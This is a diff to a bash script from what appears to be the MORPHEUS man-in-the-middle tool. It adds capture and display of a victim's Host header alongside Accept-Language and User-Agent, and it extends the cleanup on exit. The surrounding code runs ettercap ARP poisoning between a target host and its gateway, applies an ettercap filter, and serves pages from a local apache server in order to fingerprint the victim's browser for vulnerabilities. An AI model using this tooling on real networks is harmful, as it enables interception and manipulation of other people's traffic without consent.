@@ -851,14 +851,18 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
       fi
 
-
   # check if target system its vuln
   # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
+  nOn="50"
+  Hod=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}`
   AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3,$4'}`
   VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8'}`
+  echo "${GreenF}    Host: $Hod ${BlueF}"
+  sleep 1
   echo "${GreenF}    Accept-Language: $AcLa ${BlueF}"
+  sleep 1
   echo "${GreenF}    User-Agent: $VeVul ${BlueF}"
-  sleep 3
+  sleep 2
 
 
       # run mitm+filter
@@ -895,8 +899,6 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
   mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
   rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
-  rm $ApachE/miss.png > /dev/null 2>&1
-  rm $ApachE/$dIc > /dev/null 2>&1
   rm $ApachE/index.html > /dev/null 2>&1
   cd $IPATH
   # port-forward
@@ -1172,6 +1174,10 @@ sleep 1
 echo ${BlueF}[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
 mv /tmp/etter.conf $Econ > /dev/null 2>&1
 mv /tmp/etter.dns $Edns > /dev/null 2>&1
+mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
+rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
+rm $ApachE/index.html > /dev/null 2>&1
 sleep 2
 clear
 exit
